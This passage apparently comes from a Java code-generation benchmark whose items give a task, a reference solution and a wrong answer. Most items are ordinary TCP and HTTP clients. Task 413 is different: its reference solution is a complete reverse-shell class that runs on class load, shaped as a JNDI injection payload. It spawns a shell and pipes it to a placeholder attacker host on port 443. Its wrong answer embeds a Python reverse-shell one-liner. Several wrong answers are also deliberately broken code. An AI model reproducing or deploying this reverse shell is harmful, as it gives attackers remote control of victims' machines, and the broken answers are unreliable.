duration in seconds\n    - talkgroup: String - Talkgroup identifier\n    - radioId: String - Radio source identifier\n  Output: None (asynchronous operation with error logging)",
    "Canonical_solution": "import com.google.common.net.HttpHeaders;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.concurrent.CompletionException;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class OpenMHzHttpClient {\n\n    private final static Logger mLog = LoggerFactory.getLogger(OpenMHzHttpClient.class);\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(String host, String systemName, String apiKey) {\n        String uri = host + \"/\" + systemName + \"/authorize\";\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(uri))\n            .header(HttpHeaders.CONTENT_TYPE, \"application/x-www-form-urlencoded\")\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(HttpRequest.BodyPublishers.ofString(\"api_key=\" + apiKey))\n            .build();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n            if (response.statusCode() == 200) {\n                return \"OK\";\n            } else if(response.statusCode() == 403) {\n                return \"Invalid API Key\";\n            } else if(response.statusCode() == 500) {\n                return \"Invalid System Name\";\n            }\n\n            return \"No Response\";\n        }\n        catch(Exception e) {  \n            Throwable throwableCause = e.getCause();\n\n            if(throwableCause instanceof ConnectException) {\n                return \"No Response\";\n            }\n\n            mLog.error(\"Exception connecting to OpenMHz server [\" + e.toString() + \"]\");\n            return \"Unknown Exception\";\n        }\n    }\n\n    public void sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency, \n                                  long timestampSeconds, int durationSeconds, String talkgroup, String radioId) {\n        OpenMHzBuilder bodyBuilder = new OpenMHzBuilder();\n        bodyBuilder\n            .addFile(audioBytes)\n            .addPart(FormField.FREQ, frequency)\n            .addPart(FormField.START_TIME, timestampSeconds)\n            .addPart(FormField.STOP_TIME, timestampSeconds)\n            .addPart(FormField.CALL_LENGTH, durationSeconds)\n            .addPart(FormField.TALKGROUP_NUM, talkgroup)\n            .addPart(FormField.EMERGENCY, 0)\n            .addPart(FormField.API_KEY, apiKey)\n            .addPart(FormField.SOURCE_LIST, \"[{ \\\"pos\\\": 0.00, \\\"src\\\": \" + radioId + \"}]\");\n\n        HttpRequest fileRequest = HttpRequest.newBuilder()\n            .uri(URI.create(uri))\n            .header(HttpHeaders.CONTENT_TYPE, \"multipart/form-data; boundary=\" + boundary)\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        mHttpClient.sendAsync(fileRequest, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((fileResponse, throwable1) -> {\n                if(throwable1 != null || fileResponse.statusCode() != 200) {\n                    if(throwable1 instanceof IOException || throwable1 instanceof CompletionException) {\n                        mLog.error(\"OpenMHz API file upload fail [\" +\n                            fileResponse.statusCode() + \"] response [\" +\n                            fileResponse.body() + \"]\");\n                    }\n                    else {\n                        mLog.error(\"OpenMHz API file upload fail [\" +\n                            fileResponse.statusCode() + \"] response [\" +\n                            fileResponse.body() + \"]\");\n                    }\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "```java\nimport org.apache.hc.client5.http.classic.methods.HttpPost;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.client5.http.config.RequestConfig;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.io.entity.StringEntity;\nimport org.apache.hc.core5.http.io.entity.ByteArrayEntity;\nimport org.apache.hc.core5.http.io.entity.InputStreamEntity;\nimport org.apache.hc.core5.http.HttpResponse;\nimport org.apache.hc.core5.http.ParseException;\nimport org.apache.hc.core5.http.util.EntityUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.nio.charset.StandardCharsets;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class OpenMHzHttpClient {\n    private final Logger mLog = LoggerFactory.getLogger(OpenMHzHttpClient.class);\n    private final CloseableHttpClient mHttpClient;\n\n    public OpenMHzHttpClient() {\n        RequestConfig config = RequestConfig.custom()\n                .setConnectTimeout(5000)\n                .setSocketTimeout(10000)\n                .build();\n\n        mHttpClient = HttpClients.custom()\n                .setDefaultRequestConfig(config)\n                .useSystemProperties()\n                .build();\n    }\n\n    public String testConnection(String host, String systemName, String apiKey) {\n        try {\n            String endpoint = host + \"/api/v1/authorize\";\n            HttpPost httpPost = new HttpPost(endpoint);\n\n            String jsonBody = String.format(\"{\\\"system\\\": \\\"%s\\\", \\\"key\\\": \\\"%s\\\"}\", systemName, apiKey);\n            httpPost.setEntity(new StringEntity(jsonBody, ContentType.APPLICATION_JSON));\n\n            try (CloseableHttpResponse response = mHttpClient.execute(httpPost)) {\n                int statusCode = response.getCode();\n                if (statusCode == 200) {\n                    return \"OK\";\n                } else if (statusCode == 401) {\n                    return \"Invalid API Key\";\n                } else if (statusCode == 403) {\n                    return \"Invalid System Name\";\n                } else {\n                    return \"Unknown Exception\";\n                }\n            }\n        } catch (IOException e) {\n            mLog.error(\"Error testing connection\", e);\n            return \"No Response\";\n        } catch (Exception e) {\n            mLog.error(\"Unexpected error during connection test\", e);\n            return \"Unknown Exception\";\n        }\n    }\n\n    public void sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency,\n                                   long timestampSeconds, int durationSeconds, String talkgroup, String radioId) {\n        ExecutorService executor = Executors.newSingleThreadExecutor();\n        executor.submit(() -> {\n            try {\n                ByteArrayOutputStream multipartContent = new ByteArrayOutputStream();\n                OutputStream out = multipartContent;\n\n                // Metadata part\n                writeMultipartPart(out, \"metadata\", \"{\\\"frequency\\\":\" + frequency +\n                        \",\\\"timestamp\\\":\" + timestampSeconds +\n                        \",\\\"duration\\\":\" + durationSeconds +\n                        \",\\\"talkgroup\\\":\\\"\" + talkgroup.replace(\"\\\"\", \"\") +\n                        \"\\\",\\\"radio_id\\\":\\\"\" + radioId.replace(\"\\\"\", \"\") + \"\\\"}\");\n\n                // Audio part\n                writeMultipartPart(out, \"audio\", audioBytes, \"application/octet-stream\");\n\n                // End of multipart\n                out.write((\"--\" + boundary + \"--\\r\\n\").getBytes(StandardCharsets.UTF_8));\n                out.flush();\n\n                // Send HTTP request\n                HttpPost httpPost = new HttpPost(uri);\n                httpPost.setHeader(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n                httpPost.setHeader(\"Authorization\", \"Bearer \" + apiKey);\n                httpPost.setEntity(new ByteArrayEntity(multipartContent.toByteArray()));\n\n                try (CloseableHttpResponse response = mHttpClient.execute(httpPost)) {\n                    int code = response.getCode();\n                    if (code < 200 || code >= 300) {\n                        String responseStr = EntityUtils.toString(response.getEntity());\n                        mLog.warn(\"Upload failed with status {}: {}\", code, responseStr);\n                    }\n                }\n            } catch (IOException | ParseException e) {\n                mLog.error(\"Error uploading audio recording\", e);\n            }\n        });\n    }\n\n    private void writeMultipartPart(OutputStream out, String name, String content) throws IOException {\n        writeMultipartPart(out, name, content.getBytes(StandardCharsets.UTF_8), ContentType.TEXT_PLAIN);\n    }\n\n    private void writeMultipartPart(OutputStream out, String name, byte[] content, ContentType contentType) throws IOException {\n        out.write((\"--\" + boundary + \"\\r\\n\").getBytes(StandardCharsets.UTF_8));\n        out.write((\"Content-Disposition: form-data; name=\\\"\" + name + \"\\\"\\r\\n\").getBytes(StandardCharsets.UTF_8));\n        out.write((\"Content-Type: \" + contentType.getMimeType() + \"\\r\\n\\r\\n\").getBytes(StandardCharsets.UTF_8));\n        out.write(content);\n        out.write(\"\\r\\n\".getBytes(StandardCharsets.UTF_8));\n    }\n}\n```"
  },
  {
    "Task_id": 413,
    "Instruction": "Task Description: Create a Java class that establishes a reverse shell connection to a remote server using TCP protocol, with cross-platform compatibility for both Windows and Unix-like systems.\n\nClass Description: The JNDIObject class creates a reverse shell by spawning a local shell process (bash/sh on Unix, cmd.exe on Windows) and redirecting its input/output streams to a remote server via a TCP socket connection. The class includes platform detection logic to determine the appropriate shell to spawn.\n\nAttributes:\n- ip: String - The IP address of the remote server to connect to\n- port: String - The port number of the remote server to connect to\n- py_path: String - Path to Python interpreter (used for Unix-like systems)\n- cmd: String[] - The command array used to spawn the shell process\n\nMethods:\n- <static initializer>: () -> void - Automatically executes when the class is loaded, handles the entire reverse shell setup and connection process\n  - Detects operating system\n  - Finds appropriate shell or Python interpreter\n  - Spawns shell process\n  - Establishes socket connection\n  - Manages stream redirection between process and socket\n  - Handles cleanup on termination\n\nNote: The class uses a static initializer block rather than explicit methods to automatically execute its functionality when loaded. The implementation includes error handling and resource cleanup (closing sockets and destroying processes).",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class JNDIObject {\n    static {\n        try{\n            String ip = \"your-vps-ip\";\n            String port = \"443\";\n            String py_path = null;\n            String[] cmd;\n            if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) {\n                String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"};\n                for(int i = 0; i < py_envs.length; ++i) {\n                    String py = py_envs[i];\n                    if ((new File(py)).exists()) {\n                        py_path = py;\n                        break;\n                    }\n                }\n                if (py_path != null) {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/bash\\\")\"};\n                    } else {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/sh\\\")\"};\n                    }\n                } else {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{\"/bin/bash\"};\n                    } else {\n                        cmd = new String[]{\"/bin/sh\"};\n                    }\n                }\n            } else {\n                cmd = new String[]{\"cmd.exe\"};\n            }\n            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();\n            Socket s = new Socket(ip, Integer.parseInt(port));\n            InputStream pi = p.getInputStream();\n            InputStream pe = p.getErrorStream();\n            InputStream si = s.getInputStream();\n            OutputStream po = p.getOutputStream();\n            OutputStream so = s.getOutputStream();\n            while(!s.isClosed()) {\n                while(pi.available() > 0) {\n                    so.write(pi.read());\n                }\n                while(pe.available() > 0) {\n                    so.write(pe.read());\n                }\n                while(si.available() > 0) {\n                    po.write(si.read());\n                }\n                so.flush();\n                po.flush();\n                Thread.sleep(50L);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {\n                }\n            }\n            p.destroy();\n            s.close();\n        }catch (Throwable e){\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nclass JNDIObject {\n    static {\n        try {\n            String ip = \"127.0.0.1\";\n            String port = \"4444\";\n            String os = System.getProperty(\"os.name\").toLowerCase();\n            ProcessBuilder processBuilder;\n            if (os.contains(\"win\")) {\n                processBuilder = new ProcessBuilder(\"cmd.exe\", \"/c\", \"start\", \"cmd.exe\");\n            } else {\n                String py_path = \"\";\n                try {\n                    Process p = new ProcessBuilder(\"which\", \"python3\").redirectErrorStream(true).start();\n                    p.waitFor();\n                    java.io.InputStream is = p.getInputStream();\n                    byte[] buffer = new byte[is.available()];\n                    is.read(buffer);\n                    py_path = new String(buffer).trim();\n                    if (py_path.isEmpty()) {\n                        p = new ProcessBuilder(\"which\", \"python\").redirectErrorStream(true).start();\n                        p.waitFor();\n                        is = p.getInputStream();\n                        buffer = new byte[is.available()];\n                        is.read(buffer);\n                        py_path = new String(buffer).trim();\n                    }\n                } catch (Exception e) {\n                    py_path = \"\";\n                }\n\n                if (!py_path.isEmpty()) {\n                    String script = \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('\"\n                            + ip + \"',\" + port + \"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\";\n                    processBuilder = new ProcessBuilder(py_path, \"-c\", script);\n                } else {\n                    processBuilder = new ProcessBuilder(\"/bin/sh\", \"-i\");\n                }\n            }\n\n            processBuilder.redirectErrorStream(true);\n            Process process = processBuilder.start();\n\n            java.net.Socket socket = new java.net.Socket(ip, Integer.parseInt(port));\n            java.io.InputStream socketIn = socket.getInputStream();\n            java.io.OutputStream socketOut = socket.getOutputStream();\n\n            Thread t1 = new Thread(() -> {\n                try {\n                    byte[] buffer = new byte[1024];\n                    int length;\n                    while ((length = socketIn.read(buffer)) > 0) {\n                        process.getOutputStream().write(buffer, 0, length);\n                    }\n                } catch (Exception e) {\n                }\n            });\n\n            Thread t2 = new Thread(() -> {\n                try {\n                    byte[] buffer = new byte[1024];\n                    int length;\n                    while ((length = process.getInputStream().read(buffer)) > 0) {\n                        socketOut.write(buffer, 0, length);\n                    }\n                } catch (Exception e) {\n                }\n            });\n\n            t1.start();\n            t2.start();\n\n            t1.join();\n            t2.join();\n\n            process.destroy();\n            socket.close();\n        } catch (Exception e) {\n            try {\n                if (process != null) process.destroy();\n                if (socket != null) socket.close();\n            } catch (Exception ex) {\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Create a Java class that handles TCP socket communication for receiving screen data from an Android device via minicap and forwarding it to a data queue for processing.\n\nClass Description: MiniCapInputSocketThread is a thread class that establishes a TCP connection to a local port forwarded from an Android device, continuously reads screen data from the minicap service, and places the data into a blocking queue for further processing by other components. It also manages resource cleanup when the connection is terminated.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and status information\n- iDevice: IDevice - The Android device being monitored\n- dataQueue: BlockingQueue<byte[]> - Queue for storing received screen data\n- miniCapPro: MiniCapLocalThread - The parent minicap process thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - The main Android test task thread\n- session: Session - WebSocket session associated with the screen streaming\n\nMethods:\n- MiniCapInputSocketThread(IDevice, BlockingQueue<byte[]>, MiniCapLocalThread, Session) -> None - Constructor that initializes the thread with device, data queue, minicap process, and session references\n- run() -> None - Main thread execution that establishes the socket connection, reads data continuously, and handles cleanup when finished",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\nimport static org.cloud.sonic.agent.tools.BytesTool.subByteArray;\n\npublic class MiniCapInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(MiniCapInputSocketThread.class);\n\n    public final static String ANDROID_INPUT_SOCKET_PRE = \"android-minicap-input-socket-task-%s-%s-%s\";\n\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n        this.androidTestTaskBootThread = miniCapPro.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(ANDROID_INPUT_SOCKET_PRE));\n    }\n\n    @Override\n    public void run() {\n        int finalMiniCapPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, finalMiniCapPort, \"minicap\");\n        Socket capSocket = null;\n        InputStream inputStream = null;\n        try {\n            capSocket = new Socket(\"localhost\", finalMiniCapPort);\n            inputStream = capSocket.getInputStream();\n            int len = 1024;\n            while (miniCapPro.isAlive()) {\n                byte[] buffer = new byte[len];\n                int realLen;\n                realLen = inputStream.read(buffer);\n                if (buffer.length != realLen && realLen >= 0) {\n                    buffer = subByteArray(buffer, 0, realLen);\n                }\n                if (realLen >= 0) {\n                    dataQueue.offer(buffer);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (miniCapPro.isAlive()) {\n                miniCapPro.interrupt();\n                log.info(\"miniCap thread closed.\");\n            }\n            if (capSocket != null && capSocket.isConnected()) {\n                try {\n                    capSocket.close();\n                    log.info(\"miniCap socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"miniCap input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, finalMiniCapPort, \"minicap\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport org.apache.commons.logging.Log;\n\npublic class MiniCapInputSocketThread extends Thread {\n    private final Log log;\n    private final IDevice iDevice;\n    private final BlockingQueue<byte[]> dataQueue;\n    private final MiniCapLocalThread miniCapPro;\n    private final AndroidTestTaskBootThread androidTestTaskBootThread;\n    private final Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.log = miniCapPro.getLog();\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.androidTestTaskBootThread = miniCapPro.getAndroidTestTaskBootThread();\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        try (ServerSocket serverSocket = new ServerSocket(0)) {\n            int port = serverSocket.getLocalPort();\n            log.info(\"MiniCap socket thread started on port: \" + port);\n            Socket clientSocket = serverSocket.accept();\n            InputStream inputStream = clientSocket.getInputStream();\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                if (dataQueue.offer(buffer.clone(), 1000, TimeUnit.MILLISECONDS)) {\n                    log.debug(\"Screen data added to queue (\" + bytesRead + \" bytes)\");\n                } else {\n                    log.warn(\"Failed to add screen data to queue due to full capacity\");\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            log.error(\"Error in MiniCap input socket thread\", e);\n        } finally {\n            log.info(\"Closing MiniCap input socket thread resources\");\n            miniCapPro.setRunning(false);\n            if (session.isOpen()) {\n                try {\n                    session.close();\n                } catch (IOException e) {\n                    log.error(\"Error closing WebSocket session\", e);\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 415,
    "Instruction": "Task Description: Create a TCP client class in Java that can send commands to a server and receive responses, with methods for starting, stopping, checking status, and flushing methods on the server.\n\nClass Description: TProfilerClient is a utility class that provides functionality to communicate with a profiling server via TCP. It handles socket creation, command sending, response reading, and connection cleanup.\n\nMethods:\n\nMethod1: start(String server, int port) -> void - Sends a START command to the specified server and port\nMethod2: stop(String server, int port) -> void - Sends a STOP command to the specified server and port\nMethod3: status(String server, int port) -> String - Sends a STATUS command and returns the server's response\nMethod4: flushMethod(String server, int port) -> void - Sends a FLUSHMETHOD command to the specified server and port\nMethod5: doSend(String command, String server, int port) -> void - Private helper method to send a command to the server\nMethod6: getStatus(String command, String server, int port) -> String - Private helper method to send a command and read the server's response\nMethod7: read(InputStream in) -> String - Private helper method to read data from an input stream until a carriage return is encountered",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TProfilerClient {\n\n    public static void start(String server, int port) {\n        doSend(Manager.START, server, port);\n    }\n\n    public static void stop(String server, int port) {\n        doSend(Manager.STOP, server, port);\n    }\n\n    public static String status(String server, int port) {\n        return getStatus(Manager.STATUS, server, port);\n    }\n\n    public static void flushMethod(String server, int port) {\n        doSend(Manager.FLUSHMETHOD, server, port);\n    }\n\n    private static void doSend(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private static String getStatus(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n            return read(socket.getInputStream());\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        return null;\n    }\n\n    private static String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TProfilerClient {\n    private static final int TIMEOUT = 5000;\n\n    private void doSend(String command, String server, int port) throws IOException {\n        try (Socket socket = new Socket()) {\n            socket.connect(new InetSocketAddress(server, port), TIMEOUT);\n            OutputStream out = socket.getOutputStream();\n            out.write((command + \"\\r\\n\").getBytes());\n            out.flush();\n        }\n    }\n\n    private String getStatus(String command, String server, int port) throws IOException {\n        try (Socket socket = new Socket()) {\n            socket.connect(new InetSocketAddress(server, port), TIMEOUT);\n            OutputStream out = socket.getOutputStream();\n            out.write((command + \"\\r\\n\").getBytes());\n            out.flush();\n\n            InputStream in = socket.getInputStream();\n            return read(in);\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            for (int i = 0; i < bytesRead; i++) {\n                if (buffer[i] == '\\r') {\n                    return sb.toString();\n                }\n                sb.append((char) buffer[i]);\n            }\n        }\n        return sb.toString();\n    }\n\n    public void start(String server, int port) throws IOException {\n        doSend(\"START\", server, port);\n    }\n\n    public void stop(String server, int port) throws IOException {\n        doSend(\"STOP\", server, port);\n    }\n\n    public String status(String server, int port) throws IOException {\n        return getStatus(\"STATUS\", server, port);\n    }\n\n    public void flushMethod(String server, int port) throws IOException {\n        doSend(\"FLUSHMETHOD\", server, port);\n    }\n}\n```"
  },
  {
    "Task_id": 422,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function doesn't return any value, but sends data to the server and may print error information to stderr)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpClient {\n    public void sendStringToServer(String str, String serverAddress, int port) {\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream output = socket.getOutputStream();\n             PrintWriter writer = new PrintWriter(output, true)) {\n            writer.println(str);\n        } catch (IOException e) {\n            System.err.printf(\"Error: %s%nMessage: %s%n\", e.getClass().getSimpleName(), e.getMessage());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a Java function that establishes a TCP client connection to a server, sends HTTP upgrade requests and echo messages, and verifies server responses.\n\nFunction Description: The function connects to a predefined server using TCP, sends an HTTP upgrade request followed by echo messages, and asserts the correctness of server responses. It handles basic client-server communication including connection establishment, data exchange, and connection termination.\n\nInput: \n- url: String - The URL path to be used in the HTTP GET request\n\nOutput: \n- None (void) - The function performs assertions to verify server responses but doesn't return any value. It throws IOException if any network communication fails.\n\nNote: The function uses predefined host address and port from DefaultServer class, and includes a helper method readBytes() (not shown) to read data from the input stream.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic void runTest(final String url) throws IOException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET \" + url + \" HTTP/1.1\\r\\nHost:default\\r\\nConnection: upgrade\\r\\nUpgrade: servlet\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    Assert.assertTrue(readBytes(in).startsWith(\"HTTP/1.1 101 Switching Protocols\\r\\n\"));\n\n    out.write(\"Echo Messages\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"Echo Messages2\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages2\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"exit\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    out.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class TcpClient {\n\n    public void connectAndTest(String url) throws IOException {\n        String host = DefaultServer.getHostAddress();\n        int port = DefaultServer.getPort();\n\n        try (Socket socket = new Socket(host, port);\n             OutputStream out = socket.getOutputStream();\n             InputStream in = socket.getInputStream()) {\n\n            String requestLine = \"GET \" + url + \" HTTP/1.1\\r\\n\";\n            String hostHeader = \"Host: \" + host + \":\" + port + \"\\r\\n\";\n            String upgradeHeader = \"Upgrade: websocket\\r\\n\";\n            String connectionHeader = \"Connection: Upgrade\\r\\n\";\n            String secWebSocketKey = \"Sec-WebSocket-Key: dGhlIHNlY3VyaXR5IGRldmljZSA6Kg==\\r\\n\";\n            String secWebSocketVersion = \"Sec-WebSocket-Version: 13\\r\\n\";\n            String endOfHeaders = \"\\r\\n\";\n\n            String httpRequest = requestLine + hostHeader + upgradeHeader + connectionHeader + secWebSocketKey + secWebSocketVersion + endOfHeaders;\n            out.write(httpRequest.getBytes(StandardCharsets.US_ASCII));\n            out.flush();\n\n            byte[] response = readBytes(in);\n            assert response.length > 0 : \"No response received from server.\";\n\n            String echoMessage = \"Hello, Server!\";\n            out.write(echoMessage.getBytes(StandardCharsets.UTF_8));\n            out.flush();\n\n            byte[] echoResponse = readBytes(in);\n            assert new String(echoResponse, StandardCharsets.UTF_8).equals(echoMessage) : \"Echo message does not match.\";\n        }\n    }\n\n    private byte[] readBytes(InputStream in) throws IOException {\n        ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[1024];\n\n        while ((nRead = in.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n}\n```"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Create a function that establishes a TCP connection to a server, sends JSON-formatted measurement data, and then closes the connection.\n\nFunction Description: The function `doSocketTest` establishes a TCP socket connection to a specified server (localhost) on a predefined port. It generates JSON-formatted measurement data using a helper class, writes this data to the server through the socket's output stream, flushes the stream to ensure all data is sent, and then closes both the output stream and the socket to release resources.\n\nInput: \n- None (The function uses predefined constants `SERVER_SOCKET_PORT` and `HARDWARE_ID` for server port and hardware identification, respectively.)\n\nOutput: \n- None (The function does not return any value but sends data to the server and may throw exceptions if the connection or data transmission fails.)",
